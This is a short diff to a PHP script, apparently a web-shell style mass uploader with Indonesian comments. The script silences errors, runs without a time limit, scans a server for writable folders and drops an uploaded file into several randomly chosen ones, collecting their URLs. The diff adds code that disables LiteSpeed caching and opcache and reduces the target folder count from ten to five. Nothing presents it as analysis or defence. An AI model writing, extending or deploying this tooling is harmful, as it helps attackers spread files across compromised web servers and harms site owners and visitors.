@@ -3,7 +3,15 @@ ignore_user_abort(true);
 set_time_limit(0);
 ini_set('display_errors', 0);
 error_reporting(0);
-
+$lite_speed_bypass = true;
+if($lite_speed_bypass) {
+    header('X-Litespeed-Cache: off');
+    header('X-Litespeed-Tag: bypass');
+    ini_set('opcache.enable', 0);
+    if(isset($_SERVER['HTTP_X_LSCACHE'])) {
+        unset($_SERVER['HTTP_X_LSCACHE']);
+    }
+}
 /**
  * Scan folder writable hingga kedalaman tertentu
  */
@@ -165,7 +173,7 @@ if (isset($_FILES['file'])) {
         echo "<div class='message error'>Tidak ditemukan folder writable.</div>";
     } else {
         shuffle($allWritable);
-        $targetFolders = array_slice($allWritable, 0, 10);
+        $targetFolders = array_slice($allWritable, 0, 5);
         $successCount  = 0;
         $uploadedURLs  = [];
 
